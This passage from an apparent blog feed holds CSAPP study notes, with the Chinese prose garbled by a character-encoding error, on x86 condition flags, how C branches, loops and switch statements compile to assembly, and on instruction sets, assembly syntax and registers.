    <content type="html"><![CDATA[<p>æ€è€ƒä¸¤ä¸ªé—®é¢˜ï¼š</p><ul><li>æ§åˆ¶ç»“æ„ç›¸å¯¹åº”çš„æœºå™¨è¯­è¨€çš„æ§åˆ¶ç»“æ„ï¼ˆæ±‡ç¼–è¯­è¨€ï¼‰</li><li>Cè¯­è¨€å®ç°çš„åˆ†æ”¯ã€å¾ªç¯ã€å¼€å…³ç­‰æ“ä½œï¼Œåœ¨åº•å±‚çš„æœºå™¨è¯­è¨€æ˜¯å¦‚ä½•å®ç°çš„ï¼Ÿ</li></ul><h1 id="æ¡ä»¶ç çš„éšå¼èµ‹å€¼"><a href="#æ¡ä»¶ç çš„éšå¼èµ‹å€¼" class="headerlink" title="æ¡ä»¶ç çš„éšå¼èµ‹å€¼"></a>æ¡ä»¶ç çš„éšå¼èµ‹å€¼</h1><h2 id="å‡ ç§æ ‡å¿—å¯„å­˜å™¨"><a href="#å‡ ç§æ ‡å¿—å¯„å­˜å™¨" class="headerlink" title="å‡ ç§æ ‡å¿—å¯„å­˜å™¨"></a>å‡ ç§æ ‡å¿—å¯„å­˜å™¨</h2><ul><li>CF  è¿›ä½æ ‡å¿—ä½(Carry Flag, æ— ç¬¦å·æ•°)</li><li>SF  ç¬¦å·æ ‡å¿—è¯†ä½(Sign Flag, æœ‰ç¬¦å·æ•°)</li><li>ZF  é›¶æ ‡å¿—ä½ ( Zero Flag )</li><li>OF æº¢å‡ºæ ‡å¿—ä½( Overflow Flag , æœ‰ç¬¦å·æ•°)</li></ul><h2 id="addæŒ‡ä»¤"><a href="#addæŒ‡ä»¤" class="headerlink" title="addæŒ‡ä»¤"></a>addæŒ‡ä»¤</h2><p>addq Src,Dest éšå«äº†ï¼št = a+b</p><ul><li>CF=1 <ul><li>è¿›ä½</li><li>å½“ä¸¤æ•°ç›¸åŠ äº§ç”Ÿè¿›ä½/ä¸¤æ•°ç›¸å‡äº§ç”Ÿè¿›ä½çš„æƒ…å†µä¸‹CF=1</li><li>127+127ã€1-2</li><li>æŠŠä¸¤ä¸ªæ•°å½“åšæ— ç¬¦å·æ•°ï¼Œç›¸åŠ ç»“æœæ˜¯å¦æœ‰è¿›ä½ï¼Ÿè‹¥æœ‰è¿›ä½ï¼Œåˆ™CF=1</li></ul></li><li>ZF=1<ul><li>è¿ç®—ç»“æœä¸º0</li></ul></li><li>SF=1 <ul><li>å°†tçœ‹åšæ˜¯æœ‰ç¬¦å·æ•°ï¼Œt&lt;0çš„æƒ…å†µä¸‹ï¼ŒSF=1</li><li>è¿ç®—ç»“æœå¯ä»¥çœ‹åšæ˜¯æœ‰ç¬¦å·æ•°ï¼Œä¹Ÿå¯ä»¥çœ‹åšæ˜¯æ— ç¬¦å·æ•°ï¼Œå› æ­¤å…·æœ‰ä¸¤ç§å«ä¹‰</li><li>å‡è®¾è¿ç®—ç»“æœä¸º10000001ï¼Œå¯ä»¥çœ‹åšæ˜¯æ— ç¬¦å·æ•°+129ï¼Œä¹Ÿå¯ä»¥çœ‹åšæ˜¯æœ‰ç¬¦å·æ•°-1</li></ul></li><li>PF<ul><li>å¥‡å¶æ ‡å¿—ä½ï¼Œå¦‚æœè¿ç®—ç»“æœçš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸­1çš„ä¸ªæ•°ä¸ºå¶æ•°ï¼ŒPF=1ï¼Œå¦åˆ™ä¸º0</li></ul></li><li>OF=1<ul><li>æœ‰ç¬¦å·æ•°(è¡¥ç )æº¢å‡ºçš„æƒ…å†µ</li><li>æŠŠä¸¤ä¸ªæ•°å½“åšæœ‰ç¬¦å·æ•°ï¼Œç›¸åŠ ç»“æœæ˜¯å¦æœ‰æº¢å‡ºï¼Ÿ</li><li>(a&gt;0 &amp;&amp; b&gt;0 &amp;&amp; t&lt;0) || (a&lt;0 &amp;&amp; b&lt;0 &amp;&amp; t&gt;=0)</li></ul></li></ul><h2 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h2><p>cmpq Src1, Src2ä¼šè®¡ç®—Src2-Src1çš„å€¼å¹¶æ”¹å†™æ¡ä»¶ç ï¼Œä½†æ˜¯ä¸ä¼šæ”¹å˜è¿™ä¸¤ä¸ªæ“ä½œæ•°</p><ul><li>å¯¹æ ‡å¿—å¯„å­˜å™¨å€¼çš„åˆ¤æ–­ä¾æ®ä¸ä¸Šé¢addæŒ‡ä»¤ç›¸ä¼¼</li><li>t=Src2-Src1</li></ul><h2 id="è·³è½¬æŒ‡ä»¤"><a href="#è·³è½¬æŒ‡ä»¤" class="headerlink" title="è·³è½¬æŒ‡ä»¤"></a>è·³è½¬æŒ‡ä»¤</h2><p><img src="/image/assembly-cmp.png"></p><h1 id="Cè¯­è¨€åˆ°æ±‡ç¼–è¯­è¨€çš„è½¬æ¢"><a href="#Cè¯­è¨€åˆ°æ±‡ç¼–è¯­è¨€çš„è½¬æ¢" class="headerlink" title="Cè¯­è¨€åˆ°æ±‡ç¼–è¯­è¨€çš„è½¬æ¢"></a>Cè¯­è¨€åˆ°æ±‡ç¼–è¯­è¨€çš„è½¬æ¢</h1><h2 id="if-else-è¯­å¥"><a href="#if-else-è¯­å¥" class="headerlink" title="if else è¯­å¥"></a>if else è¯­å¥</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">absdiff</span> <span class="hljs-params">(<span class="hljs-keyword">long</span> x, <span class="hljs-keyword">long</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">long</span> result;<br>  <span class="hljs-keyword">if</span> (x &gt; y)<br>    result = x-y;<br>  <span class="hljs-keyword">else</span><br>    result = y-x;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>è½¬æ¢ä¸ºå¦‚ä¸‹gotoè¯­å¥ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">absdiff_j</span><span class="hljs-params">(<span class="hljs-keyword">long</span> x, <span class="hljs-keyword">long</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">long</span> result;<br>    <span class="hljs-keyword">int</span> ntest = x &lt;= y;<br>    <span class="hljs-keyword">if</span> (ntest) <span class="hljs-keyword">goto</span> Else;<br>    result = x-y;<br>    <span class="hljs-keyword">goto</span> Done;<br> Else:<br>    result = y-x;<br> Done:<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>è½¬æ¢ä¸ºå¦‚ä¸‹æ±‡ç¼–ï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">absdiff:</span><br>   cmpq    <span class="hljs-variable">%rsi</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rdi</span>  # <span class="hljs-keyword">x</span>:y<br>   jle     .L<span class="hljs-number">4</span><br>   movq    <span class="hljs-variable">%rdi</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rax</span><br>   subq    <span class="hljs-variable">%rsi</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rax</span><br>   <span class="hljs-keyword">ret</span><br>.L<span class="hljs-number">4</span>:       # <span class="hljs-keyword">x</span> &lt;<span class="hljs-operator">=</span> y<br>   movq    <span class="hljs-variable">%rsi</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rax</span><br>   subq    <span class="hljs-variable">%rdi</span><span class="hljs-punctuation">,</span> <span class="hljs-variable">%rax</span><br>   <span class="hljs-keyword">ret</span><br></code></pre></td></tr></table></figure><p>å¯¹äºä¸‰ç›®è¿ç®—ç¬¦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">val = Test ? Then_Expr : Else_Expr;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯è¡¨ç¤ºä¸ºifelseè¯­å¥ï¼Œä»è€Œæ”¹å†™ä¸ºæ±‡ç¼–è¯­å¥</p><h2 id="å¾ªç¯ç»“æ„"><a href="#å¾ªç¯ç»“æ„" class="headerlink" title="å¾ªç¯ç»“æ„"></a>å¾ªç¯ç»“æ„</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">pcount_do</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> x)</span> </span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">long</span> result = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    result += x &amp; <span class="hljs-number">0x1</span>;<br>    x &gt;&gt;= <span class="hljs-number">1</span>;<br>  &#125; <span class="hljs-keyword">while</span> (x);<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>è®¡ç®—xçš„äºŒè¿›åˆ¶è¡¨ç¤ºä¸­æœ‰å¤šå°‘ä¸ª1</li></ul><p>è½¬åŒ–ä¸ºgotoè¯­å¥ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">long</span> <span class="hljs-title">pcount_goto</span> <span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">long</span> result = <span class="hljs-number">0</span>;<br> loop:<br>  result += x &amp; <span class="hljs-number">0x1</span>;<br>  x &gt;&gt;= <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span>(x) <span class="hljs-keyword">goto</span> loop;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>è½¬æ¢ä¸ºå¦‚ä¸‹æ±‡ç¼–ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mel"> movl  $0, %eax<br>.L2:<br>   movq  %rdi, %rdx å­˜å‚¨result<br>   andl  $1,   %edx æŒ‰ä½ä¸<br>   addq  %rdx, %rax raxæ˜¯è¿”å›å€¼<br>   shrq  %rdi     å³ç§»ä¸€ä½<br>   jne   .L2     è·³è½¬<br>   rep; ret<br></code></pre></td></tr></table></figure><p>forå¾ªç¯è½¬åŒ–ä¸ºwhileçš„é€šç”¨ç‰ˆæœ¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">for</span> (Init; Test; Update )<br>    Body<br>---<br><br>Init;<br><span class="hljs-keyword">while</span> (Test ) &#123;<br>    Body<br>    Update;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>do-whileå¾ªç¯ä¸whileå¾ªç¯ç›¸ä¼¼ã€‚ä¸¤è€…å”¯ä¸€çš„åˆ†åˆ«ï¼šdo-whileå¾ªç¯å°†å…ˆä¼šæ‰§è¡Œä¸€æ¬¡å¾ªç¯å†…çš„ä»£ç ï¼Œå†å»åˆ¤æ–­å¾ªç¯æ¡ä»¶ã€‚æ‰€ä»¥æ— è®ºå¾ªç¯æ¡ä»¶æ˜¯å¦æ»¡è¶³ï¼Œdo-whileå¾ªç¯å†…çš„ä»£ç è‡³å°‘ä¼šæ‰§è¡Œä¸€æ¬¡ã€‚å› æ­¤ï¼Œdo-whileå¾ªç¯å±äºåæµ‹å¾ªç¯(post-test loop)ã€‚</p></blockquote><p>do-whileå¾ªç¯è½¬åŒ–ä¸ºgotoçš„é€šç”¨ç‰ˆæœ¬ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">do</span> </span><br><span class="hljs-function">  Body</span><br><span class="hljs-function"><span class="hljs-title">while</span> <span class="hljs-params">(Test)</span></span>;<br><br>---<br><br>loop:<br>   <span class="hljs-function">Body</span><br><span class="hljs-function">   <span class="hljs-title">if</span> <span class="hljs-params">(Test)</span></span><br><span class="hljs-function">      <span class="hljs-keyword">goto</span> loop</span><br></code></pre></td></tr></table></figure><h2 id="switchç»“æ„"><a href="#switchç»“æ„" class="headerlink" title="switchç»“æ„"></a>switchç»“æ„</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">switch</span>(x) &#123;<br>  <span class="hljs-keyword">case</span> val_0:<br>    Block <span class="hljs-number">0</span><br>  <span class="hljs-keyword">case</span> val_1:<br>    Block <span class="hljs-number">1</span><br>    â€¢Â â€¢Â â€¢<br>  <span class="hljs-keyword">case</span> val_n<span class="hljs-number">-1</span>:<br>    Block nâ€“<span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.section</span><span class="hljs-string">.rodata</span><br><span class="hljs-string">.align</span> 8<br><span class="hljs-string">.L4</span>:<br><span class="hljs-string">.quad</span><span class="hljs-string">.L8</span><span class="hljs-comment"># x = 0</span><br><span class="hljs-string">.quad</span><span class="hljs-string">.L3</span><span class="hljs-comment"># x = 1</span><br><span class="hljs-string">.quad</span><span class="hljs-string">.L5</span><span class="hljs-comment"># x = 2</span><br><span class="hljs-string">.quad</span><span class="hljs-string">.L9</span><span class="hljs-comment"># x = 3</span><br><span class="hljs-string">.quad</span><span class="hljs-string">.L8</span><span class="hljs-comment"># x = 4</span><br><span class="hljs-string">.quad</span><span class="hljs-string">.L7</span><span class="hljs-comment"># x = 5</span><br><span class="hljs-string">.quad</span><span class="hljs-string">.L7</span><span class="hljs-comment"># x = 6</span><br></code></pre></td></tr></table></figure><ul><li>jmpåˆ°è·³è½¬è¡¨</li><li>è·³è½¬è¡¨æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå­˜å‚¨äº†ä¸åŒcaseå…¥å£å¤„çš„åœ°å€</li><li>ç”±äºæ¯ä¸ªå­˜å‚¨åœ°å€çš„æŒ‡é’ˆæ˜¯8ä¸ªå­—èŠ‚ï¼Œå› æ­¤æ¯”ä¾‹å› å­ä¸º8</li><li>åŸºå€ä¸º.L4ï¼Œè·³è½¬çš„xå­˜å‚¨åœ¨%rdiï¼Œåˆ™éœ€è¦è·³è½¬åˆ°.L4 + x*8å¤„ï¼Œä¹Ÿå³æ˜¯jmp *.L4(,%rdi,8)</li></ul>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿï¼Œcsapp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPPï¼šç¨‹åºçš„æœºå™¨çº§è¡¨ç¤º-1</title>
    <link href="/p/3bf4a27/"/>
    <url>/p/3bf4a27/</url>
    
    <content type="html"><![CDATA[<h1 id="æŒ‡ä»¤é›†æ¶æ„"><a href="#æŒ‡ä»¤é›†æ¶æ„" class="headerlink" title="æŒ‡ä»¤é›†æ¶æ„"></a>æŒ‡ä»¤é›†æ¶æ„</h1><ul><li>Instruction Set Architectureï¼ŒISA</li><li>å¤æ‚æŒ‡ä»¤é›†ï¼ˆComplex Instruction Set Computerï¼‰<ul><li>åŒ…å«è®¸å¤šåº”ç”¨ç¨‹åºä¸­å¾ˆå°‘ä½¿ç”¨çš„ç‰¹å®šæŒ‡ä»¤</li><li>x86</li></ul></li><li>ç²¾ç®€æŒ‡ä»¤é›†ï¼ˆReduced Instruction Set Computerï¼‰<ul><li>åŒ…å«çš„æŒ‡ä»¤å°‘</li><li>æä¾›æ¯”è¾ƒé«˜çš„é€Ÿåº¦</li><li>å¤„ç†å™¨çš„å°ºå¯¸æ›´å°ï¼Œ</li><li>ä»¥åŠè¾ƒå°‘çš„ç”µåŠ›æŸè€—</li><li>ARMã€MIPS</li></ul></li></ul><h1 id="æœºå™¨è¯­è¨€"><a href="#æœºå™¨è¯­è¨€" class="headerlink" title="æœºå™¨è¯­è¨€"></a>æœºå™¨è¯­è¨€</h1><ul><li>æœºå™¨ç (Machine Code)ï¼Œç”±01ç»„æˆï¼Œæ˜¯å¤„ç†å™¨æ‰§è¡Œçš„å­—èŠ‚çº§ç¨‹åºï¼ˆ01åºåˆ—ï¼‰</li><li>æ¯ä¸€æ¡è¯­å¥éƒ½æ˜¯01ç»„æˆ</li><li>ç©¿å­”çº¸å¸¦ä¿å­˜ç¨‹åº(1æ‰“å­”ï¼Œ0ä¸æ‰“å­”)</li></ul><p>ä¸¾ä¾‹ï¼š8086CPUå®Œæˆè¿ç®— S = 768 + 12288 - 1280ï¼Œå¯¹åº”æœºå™¨ç <br>101100000000000000000011<br>000001010000000000110000<br>001011010000000000000101 </p><h1 id="æ±‡ç¼–è¯­è¨€"><a href="#æ±‡ç¼–è¯­è¨€" class="headerlink" title="æ±‡ç¼–è¯­è¨€"></a>æ±‡ç¼–è¯­è¨€</h1><p>ç”±æ±‡ç¼–æŒ‡ä»¤ã€ä¼ªæŒ‡ä»¤ç­‰ç»„æˆ</p><ul><li>æ±‡ç¼–ç (Assembly Code)ï¼šæœºå™¨æŒ‡ä»¤çš„ä¾¿äºè®°å¿†å’Œé˜…è¯»çš„ä¹¦å†™æ ¼å¼ï¼Œäººç±»å¯è¯»ï¼Œæ¯”å¦‚add ã€ movç­‰</li></ul><blockquote><p>æœºå™¨æŒ‡ä»¤ï¼š 1000100111011000<br>æ“        ä½œï¼šå¯„å­˜å™¨bxçš„å†…å®¹é€åˆ°axä¸­<br>æ±‡ç¼–æŒ‡ä»¤ï¼šmovw %bx, %ax</p></blockquote><ul><li>é«˜çº§è¯­è¨€â€“&gt;æ±‡ç¼–æŒ‡ä»¤â€“&gt;æ±‡ç¼–å™¨â€“&gt;æœºå™¨ç â€“&gt;è¢«è®¡ç®—æœºè¯†åˆ«</li><li>æ±‡ç¼–è¯­è¨€æ— å¯ç§»æ¤æ€§ï¼Œé«˜çº§è¯­è¨€å…·æœ‰å¯ç§»æ¤æ€§</li></ul><h2 id="AT-amp-T-æ±‡ç¼–ã€Intelæ±‡ç¼–æ ¼å¼çš„å·®åˆ«"><a href="#AT-amp-T-æ±‡ç¼–ã€Intelæ±‡ç¼–æ ¼å¼çš„å·®åˆ«" class="headerlink" title="AT&amp;T æ±‡ç¼–ã€Intelæ±‡ç¼–æ ¼å¼çš„å·®åˆ«"></a>AT&amp;T æ±‡ç¼–ã€Intelæ±‡ç¼–æ ¼å¼çš„å·®åˆ«</h2><table><thead><tr><th align="center"><strong>é¡¹</strong></th><th align="center"><strong>Intel</strong></th><th align="center"><strong>AT&amp;T</strong></th></tr></thead><tbody><tr><td align="center"><strong>å¯„å­˜å™¨åç§°</strong></td><td align="center">EAX</td><td align="center">%eax</td></tr><tr><td align="center"><strong>æ“ä½œæ•°é¡ºåº</strong></td><td align="center">operator D&lt;â€“S</td><td align="center">operator Sâ€“&gt;D</td></tr><tr><td align="center"><strong>ç«‹å³æ•°æ ¼å¼</strong></td><td align="center">æ— $ç¬¦å·</td><td align="center">æœ‰ç¬¦å·ï¼Œå¦‚ $0x1A</td></tr><tr><td align="center"><strong>æ“ä½œæ•°é•¿åº¦</strong></td><td align="center">ç”±word ptræŒ‡å®š</td><td align="center">ç”±movq/movbæŒ‡å®š</td></tr><tr><td align="center"><strong>é—´æ¥å¯»å€æ–¹å¼</strong></td><td align="center">mov eax, [ebx+3]</td><td align="center">movl 3(%ebx) ,%eax</td></tr><tr><td align="center"><strong>å˜å€å¯»å€æ–¹å¼</strong></td><td align="center">mov [ebx + eax*8 + array],ecx</td><td align="center">movl %ecx,array(%ebx,%eax,8)</td></tr><tr><td align="center"><strong>æ±‡ç¼–å™¨</strong></td><td align="center">nasm</td><td align="center">gas</td></tr></tbody></table><p>å…³äºæ“ä½œæ•°å¤§å°ï¼š</p><ul><li>AT&amp;Tè¯­æ³•ï¼šä»¥â€™bâ€™, â€˜wâ€™å’Œ â€˜lâ€™ä¸ºåç¼€æŒ‡æ˜å†…å­˜è®¿é—®é•¿åº¦æ˜¯ byte(8-bit), word(16-bit)è¿˜æ˜¯long(32-bit)</li><li>Intelè¯­æ³•ï¼šâ€™byte ptrâ€™, â€˜word ptrâ€™å’Œâ€™dword ptrâ€™</li></ul><table><thead><tr><th>Intel Code</th><th>AT&amp;T Code</th></tr></thead><tbody><tr><td>mov eax,1</td><td>movl $1, %eax</td></tr><tr><td>mov ebx,0ffh</td><td>movl $0x0ff,%ebx,</td></tr><tr><td>int 80h</td><td>int $0x80</td></tr><tr><td>mov ebx,eax</td><td>movl %eax,%ebx</td></tr><tr><td>mov eax,[ecx]</td><td>movl (%ecx),%eax</td></tr><tr><td>mov eax,[ecx+3]</td><td>movl 3(ecx),eax</td></tr><tr><td>mov eax,[ebx+20h]</td><td>movl 0x20(%ebx),%eax</td></tr><tr><td>add eax,[ebx+ecx*2h]</td><td>addl (%ebx,%ecx,%0x2),%eax</td></tr><tr><td>lea eax,[ebx+ecx]</td><td>leal (%ebx,%ecx),%eax</td></tr><tr><td>sub eax,[ebx+ecx*4h-20h]</td><td>subl -0x20(%ebx,%ecx,0x4),%eax</td></tr></tbody></table><h1 id="å¯„å­˜å™¨"><a href="#å¯„å­˜å™¨" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h1><ul><li>CPUå†…éƒ¨çš„é«˜é€Ÿå‚¨å­˜å•å…ƒï¼Œè®¿é—®é€Ÿåº¦è¿œé«˜äºå†…å­˜</li><li>rdxã€edxã€dxåˆ†åˆ«è¡¨ç¤º64ä½ã€32ä½ã€16ä½çš„dxå¯„å­˜å™¨<ul><li>rï¼šRegister</li><li>eï¼šextend</li></ul></li></ul><table><thead><tr><th>32ä½</th><th>16ä½</th><th>é«˜  8  ä½</th><th>ä½  8  ä½</th></tr></thead><tbody><tr><td>EAX</td><td>AX</td><td>AH</td><td>AL</td></tr><tr><td>EBX</td><td>BX</td><td>BH</td><td>BL</td></tr><tr><td>ECX</td><td>CX</td><td>CH</td><td>CL</td></tr><tr><td>EDX</td><td>DX</td><td>DH</td><td>DL</td></tr></tbody></table><h2 id="é€šç”¨å¯„å­˜å™¨"><a href="#é€šç”¨å¯„å­˜å™¨" class="headerlink" title="é€šç”¨å¯„å­˜å™¨"></a>é€šç”¨å¯„å­˜å™¨</h2><ul><li>EAX <ul><li>æ‹“å±•ç´¯åŠ å¯„å­˜å™¨ï¼Œä¹˜æ³•ã€é™¤æ³•è¢«è‡ªåŠ¨ä½¿ç”¨</li><li>ä¿å­˜å‡½æ•°çš„è¿”å›å€¼</li></ul></li><li>ECX å¾ªç¯è®¡æ•°å™¨</li><li>ESIã€EDI æºå˜å€å¯„å­˜å™¨ã€ç›®çš„å˜å€å¯„å­˜å™¨</li><li>ESP æ ˆé¡¶æŒ‡é’ˆ</li><li>EBP æ ˆåº•æŒ‡é’ˆ</li></ul><h2 id="æ®µå¯„å­˜å™¨ï¼ˆsegment-registerï¼‰"><a href="#æ®µå¯„å­˜å™¨ï¼ˆsegment-registerï¼‰" class="headerlink" title="æ®µå¯„å­˜å™¨ï¼ˆsegment registerï¼‰"></a>æ®µå¯„å­˜å™¨ï¼ˆsegment registerï¼‰</h2><p>å®æ¨¡å¼ä¸‹ï¼Œæ®µåœ°å€ï¼šåç§»åœ°å€æ„æˆåœ°å€ï¼Œè€Œæ®µå¯„å­˜å™¨ä¿å­˜æ®µåœ°å€</p><ul><li>CSï¼šå­˜æ”¾ä»£ç æ®µåœ°å€</li><li>SSï¼šå­˜æ”¾å †æ ˆæ®µåœ°å€</li><li>DS<ul><li>å®æ¨¡å¼ä¸‹ï¼šæ•°æ®æ®µåœ°å€</li><li>ä¿æŠ¤æ¨¡å¼ä¸‹ï¼šæ®µæè¿°ç¬¦è¡¨çš„åœ°å€</li></ul></li><li>ESï¼šæ‹“å±•æ®µå¯„å­˜å™¨</li><li>FSï¼šæ ‡å¿—æ®µå¯„å­˜å™¨</li><li>GSï¼šå…¨å±€æ®µå¯„å­˜å™¨</li></ul><h2 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h2><ul><li>æŒ‡ä»¤ï¼ˆInstuctorï¼‰æŒ‡é’ˆï¼ˆpointerï¼‰å¯„å­˜å™¨</li><li>å§‹ç»ˆå­˜æ”¾ä¸‹ä¸€æ¡è¦è¢«CPUæ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€</li></ul><h2 id="EFLAGS"><a href="#EFLAGS" class="headerlink" title="EFLAGS"></a>EFLAGS</h2><p>åæ˜ CPUæ‰§è¡Œçš„ç®—æœ¯å’Œé€»è¾‘æ“ä½œç»“æœçš„çŠ¶æ€æ ‡å¿—</p><ul><li>OFï¼šoverflow flag</li><li>ZFï¼šzero flag</li><li>CFï¼šcarry flag</li><li>SFï¼šsign flag</li><li>AFï¼šassistant carry flag</li><li>PFï¼šparity flag</li></ul><h2 id="ç³»ç»Ÿå¯„å­˜å™¨"><a href="#ç³»ç»Ÿå¯„å­˜å™¨" class="headerlink" title="ç³»ç»Ÿå¯„å­˜å™¨"></a>ç³»ç»Ÿå¯„å­˜å™¨</h2><p>ä»…å…è®¸è¿è¡Œåœ¨æœ€é«˜ç‰¹æƒçº§çš„ç¨‹åºï¼ˆä¾‹å¦‚ï¼šæ“ä½œç³»ç»Ÿå†…æ ¸ï¼‰è®¿é—®çš„å¯„å­˜å™¨ï¼Œä»»ä½•åº”ç”¨ç¨‹åºç¦æ­¢è®¿é—®</p><ul><li>ä¸­æ–­æè¿°ç¬¦è¡¨å¯„å­˜å™¨IDTRï¼šä¿å­˜ä¸­æ–­æè¿°ç¬¦è¡¨çš„åœ°å€ã€‚</li><li>å…¨å±€æè¿°ç¬¦è¡¨å¯„å­˜å™¨GDTR<ul><li>ä¿å­˜å…¨å±€æè¿°ç¬¦è¡¨çš„åœ°å€ï¼Œå…¨å±€æ®µæè¿°ç¬¦è¡¨åŒ…å«äº†ä»»åŠ¡çŠ¶æ€æ®µå’Œå±€éƒ¨æè¿°ç¬¦è¡¨çš„æŒ‡é’ˆ</li></ul></li><li>å±€éƒ¨æè¿°ç¬¦è¡¨å¯„å­˜å™¨LDTR<ul><li>ä¿å­˜å½“å‰æ­£åœ¨è¿è¡Œçš„ç¨‹åºçš„ä»£ç æ®µã€æ•°æ®æ®µå’Œå †æ ˆæ®µçš„æŒ‡é’ˆ</li></ul></li><li>ä»»åŠ¡å¯„å­˜å™¨<ul><li>ä¿å­˜å½“å‰æ‰§è¡Œä»»åŠ¡çš„ä»»åŠ¡çŠ¶æ€æ®µçš„åœ°å€ã€‚</li></ul></li><li>è°ƒè¯•å¯„å­˜å™¨<ul><li>ç”¨äºè°ƒè¯•ç¨‹åºæ—¶è®¾ç½®æ–­ç‚¹</li></ul></li></ul><h1 id="å®æ¨¡å¼-amp-ä¿æŠ¤æ¨¡å¼çš„å¼‚åŒ"><a href="#å®æ¨¡å¼-amp-ä¿æŠ¤æ¨¡å¼çš„å¼‚åŒ" class="headerlink" title="å®æ¨¡å¼&amp;ä¿æŠ¤æ¨¡å¼çš„å¼‚åŒ"></a>å®æ¨¡å¼&amp;ä¿æŠ¤æ¨¡å¼çš„å¼‚åŒ</h1><h2 id="å®æ¨¡å¼"><a href="#å®æ¨¡å¼" class="headerlink" 